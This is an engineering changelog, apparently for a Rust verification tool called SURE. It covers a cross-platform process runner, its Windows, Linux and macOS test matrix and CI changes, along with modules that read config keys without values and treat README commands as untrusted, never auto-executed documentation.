  nobody read**. All of them are unknown programs or unread text, which is the
  loud answer.
- **Not a list of every program SURE will ever run.** The table holds what SURE's
  own discovery names today and the neighbours a reader would expect beside them;
  everything else is `UnknownProgram`, which is the safe answer *and* a visible
  one — the source says where the work is.
- **Nothing has been wired to it.** No product path calls `classify` yet; it is a
  module with tests and one caller in `lib.rs`. The first task that runs anything
  under it is `P3-T005`.

## What `P3-T003` added

**Three files, one of them not Rust, and no shipped behaviour.** The acceptance is
one sentence — *"CI covers platform-specific runner behavior"* — and the work is
two commits. `b0dcc69` carries `crates/sure-core/tests/process_runner.rs`
(**+313 −3**), `.github/workflows/ci.yml` (**+5 −1**),
`docs/development/GITHUB_WORKFLOW.md`, and `progress/state.json`; `ea2f826`
carries the test file alone (**+100 −21**). The file goes from **36 tests to 41** —
the eight ignored children unchanged, so **28 parent tests to 33** — and from
**1729 lines to 2118**. `crates/sure-core/src/` is untouched, so **nothing about
the runner's behaviour changed**; what the task delivers is the platform matrix,
the tests that hold it, and the CI change that lets a run say what a platform
does.

### The table has three columns rather than two, and CI is why

The matrix lives in the test file's module documentation and **every row of it is
held by a test that runs on the platform it is about**:

| What differs | Windows | Linux | macOS |
| --- | --- | --- | --- |
| what a stop reaches | the whole tree, through `taskkill /T /F` | the process itself; nothing below it | the same as Linux |
| what a name may be | no extension is completed with `.exe` and nothing else | the name is the path, and the executable bit decides | the same as Linux |
| a file that is not an image | `.cmd` and `.bat` start, with an interpreter Windows supplies; `.ps1` does not start at all | a file whose first line names an interpreter starts; without the executable bit nothing starts | the same as Linux |
| a path that is not text | cannot be spelled at all — an unpaired surrogate is not a path | bytes are bytes: the name, the working directory and every argument arrive unchanged | **cannot be spelled at all either** — the filesystem refuses the name with `EILSEQ` |

**The first version of this table had two columns, and the fourth row read "Linux
and macOS: bytes are bytes".** Run `34929385200`, `rust (macos-latest)`:
`no file could be created at /var/folders/…/says-<bytes>-something … Os { code: 92,
kind: Uncategorized, message: "Illegal byte sequence" }` — macOS holds those bytes
in an `OsString` as happily as Linux does, and will not have a **file** by that
name. **A memory question and a filesystem question, and only the second
differs.** The row was a sentence about two platforms and was true of one, and no
local gate could have found it: `#[cfg(unix)]` is never compiled on the machine
this branch is developed on. What made it fixable in one pass is that the test's
own failure message named its platform, its path and its errno, so the fix was
written from the log.

This is the **second** time on this branch that a bare `unix` gate has cost a run
— the first is recorded in `GITHUB_WORKFLOW.md` against the four red runs before
`c735a2f`, where a `unix` test asserted **Linux's** case rule and macOS disagreed.
The three columns are now written out, and where Linux and macOS agree the cell
says **"the same as Linux"** and is held by a test on each rather than by `unix`
being taken to mean it.

### Five tests, four rows, and the per-platform deltas are the evidence

Each test's gate names the platform that **answers** the question, not the
platforms that do not: the file-that-is-not-an-image pair is `#[cfg(unix)]`, the
path-that-is-not-text case is `#[cfg(target_os = "linux")]` on one side and
`#[cfg(target_os = "macos")]` on the other, and the Windows case is
`#[cfg(windows)]`. Read out of run `34930744061` **by test name on each job**,
that gives three different deltas against the run before it:

| platform | parent tests, `34927065374` → `34930744061` | the names that moved |
| --- | --- | --- |
| Windows | 1077 → **1078** (**+1**) | `a_program_name_that_is_not_a_windows_path_is_refused_rather_than_mangled` |
| macOS | 1076 → **1079** (**+3**) | the two script tests, plus `a_program_whose_name_is_not_valid_utf8_cannot_be_created_on_macos`; **`a_program_whose_name_is_not_valid_utf8_is_the_program_that_runs` left this column** |
| Ubuntu | 1077 → **1080** (**+3**) | the two script tests, plus `a_program_whose_name_is_not_valid_utf8_is_the_program_that_runs` |

**1 / 3 / 3 is the whole of what this task added, and the three figures are
different because the three jobs compile different code** — which is the same
sentence as the acceptance, arriving as arithmetic. The parent *line* count stood
still at **33** on all three (no new binary) and the ignored count stood still at
**9** (no new child), so the +1 and the +3s are test functions inside
`tests/process_runner.rs` and nothing else. On Windows that is confirmed by name,
one row and one row only printed out of 29 matched binaries: `process_runner`
**28 → 29**.

### What the pair of Unix tests is about

`A_SCRIPT` is the smallest program a Unix test can put in front of the runner —
two lines, `#!/bin/sh` and a `printf '%s' "$1" > "$2"` — and it is written twice,
`0o755` and `0o644`, with the mode **set rather than left to the umask, because a
premise the environment picks is not a premise**. `printf` rather than `echo`
because an argument under test may be bytes that are not text and `echo` is free
to do what it likes with them, and the name has no extension on purpose: on these
platforms a name is a path and nothing else, so a runner that had learned a rule
about extensions would have learned Windows'.

**The negative half is about SURE and not about the operating system.** The
without-the-bit test holds the same bytes, the same interpreter line and the same
arguments as the positive one, so the mode is the only difference — and what it
asserts is that the runner does not `chmod`, does not run `sh <script>`, and does
not choose an interpreter of its own to make a request succeed. "It did not run"
and "it was not asked to run" are different facts, and a test showing only the
first is satisfied by a runner that refused everything.

### `--no-fail-fast`, and its justification was measured rather than quoted

`GITHUB_WORKFLOW.md` carried "the first failing target aborts the rest" as a known
fact. Measured on this machine by adding one deliberately failing test to
`sure-core --lib` — the earliest target with real content — `cargo test
--workspace` **launched three targets** (563 passed, 1 failed) and stopped, while
`cargo test --workspace --no-fail-fast` **launched 29** and reported all **43**
results. **Twenty-six targets, the whole of every integration test in the
workspace, were invisible under the command CI was running, and nothing in its
output said so.** The failing test was removed and `lib.rs` confirmed
byte-identical to its committed state before anything else ran. The bullet in
`GITHUB_WORKFLOW.md` was rewritten rather than left: it had been true when written
and would have gone on reading as true.

**The red run is where the flag paid for itself, and that is a measurement rather
than a prediction.** On `rust (macos-latest)`, the failing test sits with **14
more binaries still to start and 19 of the 33 parent result lines still to come** —
so the log of the run that failed is why the failure could be diagnosed at all.
What the *old* command would have done to that log is inferred from the local
3-vs-29 measurement, not observed here, and it is recorded that way.

### What `P3-T003` does not establish

**Nothing about a macOS with a differently-formatted volume.** The `EILSEQ` (92)
assertion is measured on one filesystem — the runner's own temp directory on APFS
— and the test that pins it is the thing that would find out if that changed.
**Nothing about a caller naming a `.cmd`/`.bat`**: three Windows tests exercise
that behaviour and none of them settles the owner decision `P3-T001` left open.
**Nothing about the runner's behaviour on Linux or macOS from this machine**: the
Unix-side tests cannot be compiled or run here at all, so CI is their compiler and
their only runner, and every statement about those two columns in this entry comes
from a CI log.

## What `P3-T002` added

**One file, tests only, no shipped behaviour.** `crates/sure-core/tests/process_runner.rs`
goes from 29 tests (23 parents + 6 ignored children) to **36 (28 parents + 8
children)**: five new tests, two new ignored children, no test removed, no
assertion weakened, and `crates/sure-core/src/` untouched. The acceptance is three
sentences: *"Start/timeout/cancel/output capture pass on native Windows"*,
*"Process-tree cleanup is tested without relying on Unix signals"*, and *"Paths
with spaces/Unicode are covered."*

**The third sentence was covered in one position out of five.** The working
directory was already tested, in the one position the operating system takes as a
value of its own. A path in a process request is also the **program** — which has
to survive being turned into a command line by somebody — an **argument**, a value
in the **environment block**, a second encoding surface with its own conversion,
and, in reverse, the **bytes coming back out** of a program. Four tests now hold
the four that were missing:

| position | test |
| --- | --- |
| the program | `a_program_at_a_path_with_a_space_and_unicode_is_the_program_that_runs` |
| an argument | `an_argument_that_is_not_ascii_arrives_as_one_argument_unchanged` |
| the report path | `a_report_path_with_a_space_and_unicode_is_the_path_the_child_writes_to` |
| the bytes out | `what_a_program_writes_outside_ascii_comes_back_as_the_bytes_it_wrote` |

They share one `const AWKWARD` (`a directory with a space and é中文`) and one
`const NOT_ASCII` (`héllo wörld 中文 🎉`) so that "a path with a space and a
character outside ASCII" means one thing everywhere in the file. `NOT_ASCII`
carries three different problems rather than one, because the three fail
differently: `é` is what a byte-oriented path passes through and a code-page
conversion does not, `中文` is what only a real encoding survives, and `🎉` is
outside the Basic Multilingual Plane — two UTF-16 code units, one surrogate pair
— which is the case a conversion that stops at the first unit truncates. The first
of the four tests copies `current_exe()` to
`<scratch>/a directory with a space and é中文/a program with a space and é中文.exe`
and runs the copy, so the assertion is about a real executable at an awkward path
rather than about a request that echoes back what it was given.

### The tree test's central assertion proved nothing on Windows, and that was measured rather than argued

`a_stopped_run_reaches_what_the_run_started_or_says_that_it_did_not` claims "a
stop reaches the whole tree", and its evidence was that the grandchild's report
never appeared. **A file that is absent is what a stopped grandchild leaves behind
and also what a grandchild that never ran leaves behind.** Measured twice on this
machine:

- With the grandchild's mode string changed to a name that is not a test, and the
  new marker assertion in place, the test **fails**, saying the grandchild never
  started.
- With that assertion removed — the old reading — the same run **passes**, in
  3.26s, reporting `WholeTree` about a tree that never existed.

On Unix the same change fails loudly, because that branch asserts the opposite
outcome. **The hole was in the branch that skipped a measurement**, which is the
same sentence this file keeps having to write.

The fix is a positive control rather than a longer sleep.
`child_waits_to_be_released` writes `<report>.started` the moment it is running,
then polls for `<report>.release`; the parent asserts the marker **before** it
reads the absence, so "the stop reached it" and "it never existed" cannot be
confused, and afterwards it drops the release to ask the second question by the
only means both platforms have — a process that is running writes within a poll
and a process that was stopped cannot write at all. The waiting also takes the
clock out of the test: the old grandchild slept 1.5s, which must be long enough
not to finish before the stop and short enough to be worth waiting out, and on a
fast machine the first of those is what breaks. `ABANDONED` (30s) bounds a child
whose release never comes;
`a_cancelled_run_reaches_what_it_started_too` holds the same claim for the
caller's decision rather than the runner's clock, cancelling only after the marker
exists so it cannot race two process starts.

### The four matrix tests are characterisation tests, and saying otherwise would be a false claim

No mutation of the runner as it stands can make them fail: `OsString` round-trips
on Windows, and a `to_string_lossy` step applied to valid Unicode is the identity,
so every way of breaking them first has to introduce a conversion the code has
never had. What they are for is the rewrite that reaches for one — a raw command
line, a job object, a hand-built environment block. They are recorded as
characterisation rather than dressed up as mutation-covered, and `DECISIONS.md`
says the same thing.

The one mutation this task added is about the position that *can* be got wrong in
the code as written: *"the program path is quoted, in case it has a space in it"*,
which is the plausible mistake, since a path with a space is the reason to quote
and the process API quotes the program itself. It is caught, and measured
directly rather than read off the harness's three-line display cap: with it
applied, `a_program_at_a_path_with_a_space_and_unicode_is_the_program_that_runs`
fails alone in 0.01s with `os error 123`, `ERROR_INVALID_NAME`, before any process
is started.

### Four comments in this work overclaimed, and were corrected before the commit

One said a permission bit "is checked rather than assumed" when nothing checked
it; one described `std::process::Command` as using `lpApplicationName` against
`lpCommandLine`; one said the outcome naming the program is how the test tells
"the copy ran" from "another program ran" — when the outcome carries the
**request's** program back, so it says what was asked for and the report is what
says what ran; and one said every "was it stopped?" assertion in the file would
have been satisfied by a grandchild that never ran, which is true of the Windows
assertion and was narrowed to it after measurement.

### The artefact the mutation run left on disk

With *"the program runs wherever SURE happens to be rather than where it was
told"* applied, the batch-file test's `echo it ran > ran.txt` landed in the crate
root instead of its scratch directory, and `crates/sure-core/ran.txt` was there
afterwards holding `it ran`. Inspected, deleted, and recorded because it is the
same mutation leaving physical evidence rather than a log line.

### What `P3-T002` does not establish

**Nothing about a path that is not valid UTF-8.** On Windows a path that is not
valid Unicode cannot be spelled at all, and the interesting cases — a Windows path
that is not valid UTF-16, a Unix path that is not valid UTF-8 — are `P3-T003`'s
question rather than this one's. The owner decision `P3-T001` left open (whether a
caller may name a `.cmd`/`.bat`) is unchanged and is now **exercised by two more
tests rather than settled by them**.

## What `P3-T001` added

`crates/sure-core/src/process/` — five files, **1478 lines** — with 6 unit tests,
and two integration test files beside it: `tests/process_runner.rs` (29 tests, of
which 6 are `#[ignore]`d helper children that the parent tests spawn) and
`tests/spawn_sites.rs` (2 tests). The acceptance is two sentences: *"Executable/
args/cwd/env/timeout/cancel/output limits are explicit"* and *"Direct args used
instead of unsafe shell string construction where possible."*

**The first sentence is a shape rather than a checklist, and most of its tests
hand a value back before anything runs.** `ProcessRequest` holds a program, a
vector of arguments, a working directory, an `Environment`, a `Limits` and a
`Cancellation`; `Limits::new` takes a timeout and both output bounds together and
there is **no `Default`**, because a run with no deadline is a check that hangs
and a check that hangs cannot be told from one that is still working — the
failure `FINGERPRINTING.md` already names in those words. `Environment` has no
default either, and `Cancellation` is one type over an `Arc<AtomicBool>` rather
than a caller's half and a runner's half, because the two halves are the same
fact. There is deliberately **no `PartialEq`**: every field but the cancellation
could be compared, and comparing a live handle would make two identical commands
read as different ones, so a caller that means "would these run the same command"
reads the accessors and says so itself.

**The second sentence is a door that is not there.** `command()` is the only
place a `Command` is built from a request — so what the accessors report and what
runs cannot drift apart — and it hands the vector to `args`, which neither joins
nor quotes. There is no `from_command_line`, no `shell`, no field that is a
command line. A caller holding `npm install && npm test` has a `String` and
nowhere to put it. This is `documents.rs`'s shape for the same reason: splitting
shell text into a program and its arguments *is* the act of starting a shell, and
it is where a path with a space stops being one path.

**What the runner does, in the order it matters.** Stdin is null, because nobody
is there to answer a question and a program waiting for input is a run that hangs
rather than one that fails. Both streams are piped and read to the end; a bound
is on what SURE **keeps**, and going past it discards the rest rather than closing
the pipe, because closing it makes a talkative program fail on a broken pipe and
reports that as the command's fault. A run ends as `Exited`, a deadline, or a
cancellation, and the **tree** is stopped — `taskkill /T /F` on Windows, read as
a report rather than assumed, because a deadline that can be declined is not a
deadline. `store_concurrency` is the precedent for the `#[ignore]`d children.

**"There is no shell" was wrong in one direction, and measuring it is part of
this task.** Windows starts a command interpreter for a batch file without being
asked: hand the runner the path of a `.cmd` and it runs, and the image of the
process created is `C:\Windows\System32\cmd.exe` — read with
`QueryFullProcessImageNameW`, not inferred. Measured three ways before any of it
was written down. A name with **no** extension is completed with `.exe` and
nothing else, so a bare `npm` is not found where `npm.cmd` is installed and a
`build.cmd` beside the child is not reached by its stem. A `.ps1` fails with
`winerror 193`, "not a valid Win32 application", which is a different fact from
"not found". Six shipped files carried a claim this made false — `process/mod.rs`,
`process/request.rs`, `process/error.rs`, `doctor.rs` (the batch-file claim) and
`documents.rs`, `support.rs` (the "one `Command::new` in shipped code" claim) —
and in `doctor.rs` the **behaviour was already right and only the reason was
wrong**, which survives longest because the answer looks correct.

**Whether a caller may name a batch file is left open on purpose.** That is
`P3-T004`'s classification, `P3-T005`'s permission and `P3-T007`'s enforcement;
the runner neither asks for it nor prevents it, and the module doc records the
fact and the open question together. The three tests holding it are
**`#[cfg(windows)]`**, which is a permanent +3 in the Windows count and is
recorded as a platform fact rather than a discrepancy.

**"No product path calls `run` yet" is a test, not a paragraph.**
`tests/spawn_sites.rs` holds two rules: every shipped file whose *code* builds a
`Command` is named with a reason, and nothing outside `src/process/` names a
`ProcessRequest` — the load-bearing one, because `run` takes a `&ProcessRequest`
and there is no other entry point, so a file that cannot name the type cannot be
a caller. That is stronger than searching for `process::run`, which a `use` or a
re-export walks past. **The rule is meant to fail the day the runner is wired
up**: `sure_core::support`'s level-C ceiling is justified by no project code
running, so the caller and the ceiling have to move in one commit.

**The one source-level guard this broke was found by the harness, not by
reading.** `fingerprint_git.rs`'s `git_is_started_in_exactly_one_place` failed on
the runner's `Command::new(&self.program)` and the first mutation run stopped at
`BASELINE IS NOT GREEN` — the baseline check doing its job. The guard was
**narrowed rather than weakened**: `process/request.rs` is exempted *by name*
with its reason beside it, while `Command::new("git")` stays forbidden there and
everywhere else.

**One test was added because a mutation could not otherwise be caught.**
`discarded > 0` → `discarded > 1` in `CapturedOutput::was_truncated` agreed with
the original everywhere the suite looked, because the boundary test threw
thousands of bytes past the bound. Both sides of the boundary are now held, and
the second test says why there are two: a check spelled `>= limit` reports every
run that said exactly as much as it was allowed as cut short, so the two ways of
being wrong point in opposite directions.

## What `P2-T011` added

`crates/sure-core/src/intent_model.rs` (14 unit tests) and
`crates/sure-core/tests/intent_sources.rs` (7 tests) beside it, plus
`pub mod intent_model;` and a corrected `PROJECT_INTENT.md`. The acceptance is
two sentences: *"Intent sources preserve provenance/trust labels"* and *"Inferred
intent cannot satisfy user requirements."* **The first is a claim about a label
surviving**, and a test can hold it wrongly by reading the label off and agreeing
with it — so every test here that asserts a label also drives the statement
through `may_claim_full_fulfilment`, which is the gate the label is actually for.
The second is held by the same gate turned the other way: an intent of nothing
but guesses cannot reach zero requirements short.

**The label belongs to the door, and no door takes one.** Every channel has a
function that produces a `Requirement` and writes its own `IntentSource`, and no
function here that *produces* a `Requirement` takes a source as an argument. A
caller holding a command it read out of a README has nothing to ask for, because
there is no parameter to ask with: provenance survives by a shape the module does
not offer an alternative to, rather than by a rule its code follows. The one
function that does take a source, `from_source`, goes the other way — it reads
statements *back* by the label they arrived with — and the module comment names
it rather than leaving a reader to find it and doubt the rule.

**`observed_user_request` takes an `&Authority` and not a `&Config`, and the same
bytes on disk give opposite answers.** `sure.yaml` lives inside the project, and
the project is written by the same agent whose work is being judged, so
`privacy.full_recording: true` there is a **request**, and only the user's own
settings outside the project can grant it. The integration test holds one
`sure.yaml`, byte for byte, refused first as an escalation and then granted, with
a control asserting the kept request is worth exactly what a typed goal is worth
— the privacy decision is about whether the words are kept, not about how much
they count.

**Six rows in the module's table and five labels.** `documented_goal` and
`DocumentReport::as_requirements` are one channel reached by two doors, and both
ask `Config::goal_source()` rather than naming the label themselves, so
`P2-T009`'s decision point is still the only one. `documented_goal` answers
`None` for a goal with no words rather than manufacturing a blank requirement,
and it keeps the project's own spacing: the test feeds it a padded goal, because
a door that tidied the words and still set `raw_retained` would be reporting
something it did not do. `agent_claim` and `inferred` leave the flag false, and
each door says why — the claim door does not know whether the caller kept the
agent's sentence or restated it, and an inference has no original wording behind
it at all.

**A test of mine made a claim it could not hold, and it was deleted rather than
reworded.** `a_documented_goal_is_labelled_by_the_one_place_that_decides_it`
compared the door's answer against `Config::goal_source()` and its comment said
*"this is the assertion that fails on that day"* — but **no test can move a
`const`**, so the mutation that writes the literal is invisible to that
comparison and the test would have passed for a different reason than its name
said. That is the failure `P2-T009` punished in `command_from`'s unreachable
guard, one step further out: there the guard was unreachable, here the assertion
was. The claim is declared unobservable in the harness with the condition that
would falsify it, and a distinctness test replaced it, asserting that the three
channels' identifiers all differ — a collision is what would make two statements
one, and that *is* observable.

**Three claims in the module's own comment were false, and reading it against the
code is what found them.** It said *"no function in this module takes an
`IntentSource` as an argument"*, which `from_source` does; it said *"one of the
four channels"*, where `IntentSource::ALL` has five; and it said `P8-T005`
*writes* `OBSERVED_REQUEST_ID`, in the present tense about a task that is
`queued`. All three were fixed before the mutation run, so the run describes the
committed revision rather than the one before it.

**The permission is implemented and the capture is not, and `PROJECT_INTENT.md`
said otherwise.** That document's full-session section described a pipeline this
build does not have; it now says so in those words and names what `P2-T011`
actually implemented — the rule such an integration will have to satisfy.
`P8-T005` stays queued, and `OBSERVED_REQUEST_ID` has no producer.

**Not established.** Nothing in `sure-cli` builds a `ProjectIntent` other than
from the command-line goal, so the doors with nobody knocking are still
hypotheses about how those channels will arrive. This module does not compare a
statement against a project (`P6-T008`), does not assemble a whole project's
intent, and does not derive what a label is worth — `RequirementAuthority` does
that, in the domain, in one place, and a second derivation here is how the two
would come to disagree. Newly recorded rather than closed:
**`project_intent.spec_path` is validated and read by nothing** (it is refused
outside the project at `config/mod.rs` and nothing opens it). It is a change to
what a *document* is, so it belongs with the documents pass, and it carries a
Windows deduplication risk — a `spec_path` naming a file the walker also reaches
would make one document arrive twice under two paths.

## What `P2-T009` added

`crates/sure-core/src/documents.rs`, and `crates/sure-core/tests/document_commands.rs`
beside it. The acceptance is one sentence with two halves:

> Extracted commands are untrusted documentation and never auto-executed merely
> because documented.

**The first half is a label, and the label is derived rather than restated.**
`DocumentedCommand::source()` answers `Config::goal_source()`, so a project file
is documentation here for the same reason it is documentation in
`support::classify` — one decision point instead of two that happen to agree
today. `as_requirement()` turns a command into a `Requirement` marked
`with_raw_retained(true)`, because the text recorded is the document's own
wording and not a paraphrase of it.

**A `DocumentedCommand` *is* the claim, so there is one list here and not two.**
A fenced block carrying a language is the only claim a document makes that SURE
can read off by rule; prose is not, and pulling a requirement out of a sentence
would be the T17 hallucination. `lying-readme`'s description ("README setup
command does not work on fixture") and `P4-T005`'s acceptance both read it that
way. It is written down as a decision because it is one.

**The second half is about something that did not happen**, which is the kind of
claim that is easy to write and hard to hold. It is held by asserting three
things together — the command was found, the document was read, and a recursive
snapshot of the project is byte-identical before and after — plus a control
proving the snapshot helper can see a new file, because a helper that never
notices anything would satisfy the first assertion perfectly. The fixture's
command is `npm install && echo SURE-RAN-THIS > SURE-RAN-THIS.txt`, so the
evidence of a leak is a file whose absence is checkable rather than an inference.
`the_helper_that_looks_for_new_files_can_see_a_new_file` is that control and it
is the reason the canary is evidence rather than decoration.

**"Never auto-executed" is a property of the shape rather than a promise.** No
field on `DocumentedCommand` can hold a program and its arguments; no
shell-splitting exists anywhere in `sure-core`'s shipped code; `DocumentReport::of`
is the only door a report can come through; and `sure-cli` builds no
`DocumentReport` at all — `DocumentReport` and `DocumentedCommand` appear in
exactly two files, the module and its test. The module declines the stronger
claim in as many words: *there is no function anywhere that turns a
`DocumentedCommand` into an `ApprovedCommand`, so today the path does not exist
rather than being blocked.* A blocked path is a promise; a missing one is a fact
about the code.

**Indentation is ignored when looking for a fence, and that is the one deliberate
departure from CommonMark.** A fence inside a list item is indented by the marker
width, so following the spec exactly reports *no commands* and a complete reading
— a silent loss dressed as a clean result. `unindent` (at most three spaces) is
kept for headings, and the asymmetry is deliberate: a heading read wrongly costs
a section label, a fence read wrongly costs every command inside it.

**What the mutation run found, because neither finding was visible by reading
the code.** `target/tmp/mutate15.py`, 37 mutations. The **unmutated baseline was
not green** — `a_pass_that_has_read_its_byte_budget_refuses_the_rest` failed
before any mutation was applied, because it encoded a *predictive* budget while
this module and the accepted `references.rs` both check whether the budget is
**already spent**, as `UnreadReason::OutOfBytes`'s own documentation says. With a
30-byte budget and a 21-byte first document nothing could refuse the second, so
the test could never pass; the fix went to the test and not the code, because
`references.rs` is accepted with the already-spent reading pinned. **The 1017
carried into this session as "all gates green" had been measured before those two
budget tests were written and was never re-measured**, which is the whole reason
that check exists. Then one observable mutation survived: it aimed at
`command_from`'s `if text.is_empty()` guard, which **can never fire**, because
`trimmed` comes from `raw.trim()` and a line that is only `$` has already lost
the space before `strip_prefix("$ ")` is asked. The test written to pin that
guard passed for a different reason than its name said. The guard was **removed
rather than declared unobservable**, following `P2-T008`'s precedent for the
`symlink_metadata` guard that was not added, and the mutation now aims at the
`trim` instead.

**One seam was changed outside the new module.** `references.rs`'s
`declaration_candidate` now calls `documents::is_document` rather than repeating
the two name shapes, so "which files are documents" has one answer, and the
harness carries a mutation that removes the shared call's `Document` arm because
the change is visible from both sides. `mutate14.py`, which is `P2-T008`'s
harness, has no anchor on that function, so `P2-T008`'s accepted evidence is not
disturbed by the change.

**Not established.** Nothing in `sure-cli` builds a `DocumentReport`, so the
reading is a property of the module and its tests and not yet of a `sure`
invocation — the same family as `ComponentGraph`. The module does not parse
Markdown beyond fence markers and ATX headings, and it does not decide whether a
command is dangerous. A block whose tag is known and is not a shell yields
nothing and is **not** a gap, which is a decision and has no arm in
`UnreadReason`. And SURE does not know whether a documented command *works*:
this module reproduces what the document says, and whether it is true is
`lying-readme`'s question, which needs execution authorization this build does
not have.

## What `P2-T008` added

Acceptance: *"Finds required keys without collecting values"* and *"Can compare
references with examples/docs."* One module, its integration tests, and no
change to any other module's behaviour.

`crates/sure-core/src/references.rs` — `ReferenceReport::of(&Discovery)` and
`with_options`, a view over a `Scan` the way `components::ComponentGraph` is, so
it opens no file it was not handed and cannot disagree with the discovery it came
from about what was in the project. It reads the project's source files for the
five forms a key is asked for in, reads its example files and documents for the
keys they declare, and compares the two into one `KeyReport` per key, each with a
three-armed `KeyStatus`. `crates/sure-core/tests/config_references.rs` holds 18
integration tests; the module holds 25 unit tests.

### The value rule is in the type, and that is the acceptance's first sentence

`SECRET_REDACTION.md` asks SURE to "avoid logging raw environment values".
**No field on `Reference` or `Declaration` can hold a value**, and
`key_from_env_line` takes one `&str` and returns an owned `String` key with
nowhere for the right-hand side to go. So the rule is not a promise the module
keeps — it is a shape the module has.

A structural claim of this kind is exactly the one that passes vacuously, so the
canary tests are built so that absence alone cannot pass them: each asserts the
key *was* found **and** the file *was* read **and** the canary value is absent
from `format!("{report:?}")`. A further control, named for what it proves rather
than for what it checks —
`the_helper_that_looks_for_the_canary_can_see_a_value_that_did_reach_the_report`
— puts the canary in a **filename** and asserts the helper finds it in a rendered
path, so the helper is known to be capable of failing. Without that control, a
helper that always returned "absent" would make every other canary test green.

### `.env` is never opened, and that is a decision rather than a loss

`.env`, `.env.local`, `.env.production` and `.env.test` are not candidates. They
are also **not pushed to `unread()`**, so `is_complete()` stays true for a
project SURE deliberately did not read the values of. That is the right answer
and it is worth being explicit about, because the alternative — reporting them as
unread — would tell a caller the pass was incomplete when nothing was lost.

It is held by a matched pair that differs in one byte of a filename:
`the_file_the_values_are_in_is_never_opened` against
`an_example_file_with_the_same_contents_is_read_and_says_so`. A pass that read
`.env` and skipped `.env.example` fails the second; a pass that skipped both
fails the second; a pass that read both fails the first. This is the same
mutation-resistant-pair technique the repository has used before, and it exists
because a single test asserting "`.env` was not read" is also passed by a pass
that reads nothing at all.

### The pass is textual, and both limits are pinned by a test that states them

A read inside a comment is reported as a read
(`a_mention_inside_a_comment_is_still_a_read`); a key documented in prose with no
assignment is not a declaration; a key the code assembles at run time is not a
read even where it is decidable. The module doc says what it does not do —
it does not parse, it does not know what a key means, it does not read the
environment, it does not read `.env`, and **it does not decide whether a key is a
secret**: `redact::looks_like_credential_name` exists for SURE's own messages,
and a key named `AWS_SECRET_ACCESS_KEY` is the finding, not something to redact.

### The two one-sided arms name the two lists, not the project

`ReadButNotDeclared` and `DeclaredButNotRead` are worded to describe what the two
lists contain rather than what the project lacks — the same distinction
`components::Members::NotRead` draws, and for the same reason. `is_complete()`
gates the sentence that says whether the reading finished, and
`the_sentence_counts_each_side_and_not_the_keys_there_are` pins both counts in a
fixture where they differ from the total (2 read, 3 declared, 4 exist), because a
sentence built from the total would state how many keys the project has.

## What `P2-T012` added

`crates/sure-core/src/support.rs` — the rule — and
`crates/sure-core/tests/support_levels.rs` — the seven tests that drive it end to
end over real directories. The record it fills already existed in
`crates/sure-domain/src/vocabulary.rs` (`Project.support`, a `ProjectSupport` of
level + reason), and that file gained the one unit test the record was missing.
Documentation: a new section in `docs/product/SUPPORTED_STACKS.md`, an extended
`## Project` in `docs/architecture/DOMAIN_MODEL.md`, and a paragraph in
`docs/architecture/ECOSYSTEM_DISCOVERY.md` separating a *grade* from a *level*.

The acceptance is one sentence: *"Project/report records
first-class/generic/inspect-only support level."* It is answered by making the
level a **derived** value with a stated rule rather than a field a caller sets.

### The rule, and why it is the weakest of two things

> **The project's level is the weakest of what SURE read and what SURE can do
> with it.**

`classify` takes a `Discovery` — not a path, so it cannot disagree with the scan
it came from about what was in the project, and it opens nothing. What SURE read
is the weakest grade across the discovered stacks; what SURE can do is `CEILING`;
the answer is the weaker of those. Neither half alone is the level: a project
whose manifest SURE read perfectly would still be level A if *reading* were all a
level claimed, and a project with no manifest at all would still be level A if
*capability* were all it claimed.

`SupportLevel`'s variants are declared **best first**, so the weakest is `Ord::max`
and `weakest` is a `max` fold — a one-word difference from a rule that promotes
every project to the strongest thing found in it. That ordering is load-bearing
and was previously only implied; it is now written on the type and held by
`support::tests::the_order_of_the_levels_is_by_strength`.

### `CEILING` is `InspectOnly`, and that is an evidence claim, not a mood

Levels A and B in `docs/product/SUPPORTED_STACKS.md` both include *running*
something. **This build runs no project code**, and that was established by
grep rather than by impression: the only child process any product code path
spawns is `git`, read-only, for the content fingerprint —
`fingerprint/git/mod.rs` holds the single `Command::new` — and `crate::doctor`
probes toolchains, which is SURE talking about its own prerequisites.

So every project is reported at level C today. That is a **deliberate
under-claim**, and the choice behind it is the product priority rather than the
tidy answer: `SupportLevel::plain_description(Generic)` renders *"SURE can find
how this project is built and run"*, and SURE cannot run it. **A false green is
more serious than a visible error**, so the level says what SURE can do and the
*reason* says what SURE read. `CEILING` is a constant rather than a comment
because a claim this load-bearing wants a name code can point at:
`the_ceiling_todays_build_claims_is_never_above_inspect_only` is written as a
tripwire over every variant, so the day checks land it fails and asks to be
rewritten deliberately instead of accommodating the change.

### The vocabulary conflict, recorded rather than resolved quietly

`ECOSYSTEM_DISCOVERY.md`'s grade tables award `Generic` to any project with a
readable manifest, with the reason *"SURE can find how the project is built and
run"* — that is, SURE can find **the commands**. The product doc's level B is a
higher bar: finding the commands **and running approved generic checks**. One
word, two bars, and a project with a readable `Cargo.toml` is graded `generic` and
reported at level C.

**That difference is not reconciled by silence.** `what_sure_can_do` puts both
levels in the user's sentence — *"That reading alone would be level B (generic),
but this build runs no project code… So the project is at level C
(inspect_only)"* — and the four full sentences are pinned verbatim in the
integration test, so a reworded one fails there rather than reaching a person
unreviewed.

### The open decision, which is the owner's and is written up in three places

The alternative reading is that the level states what SURE **understands**: then
discovery's grade is the whole answer, `CEILING` becomes `Generic`, and a project
with a readable manifest is level B. It is a real reading, not a straw man — it is
what `ECOSYSTEM_DISCOVERY.md` already says in so many words. It was not taken
because of the sentence `plain_description` renders, but **it is a two-line
change here plus the tests that pin today's answer.** Recorded in the module
comment, in `SUPPORTED_STACKS.md`, and here, so that whoever settles it finds it
rather than rediscovering it.

### What the tests can and cannot observe, stated in the file rather than left implied

Because `CEILING` is `InspectOnly`, **every project classifies as level C**, and
the composition `weakest(understood, CEILING)` cannot be told apart from the
ceiling alone by anything in the integration test. That is written at the top of
`support_levels.rs` in those words. It is not hidden and it is not papered over
with a passing test that looks like it checks the composition: the integration
tests assert the level **and** the pinned reason, the reason names the reading
that was capped, and
`weakest_picks_the_weakest_whatever_order_it_arrives_in` is the unit test holding
the fold until a check exists to make it observable from outside. The day
`CEILING` rises, the level assertions in the integration test fail — which is
what they are for.

One consequence worth carrying: **the reason is the only observable surface for
most of this rule.** A test that read only `level` would pass against several of
the mutations the harness applies, which is why every assertion in the
integration test goes through one `classification()` helper that refuses to
return a level without the sentence supposed to justify it.

## What `P2-T010` added

`crates/sure-core/src/project_intent.rs`, its integration test
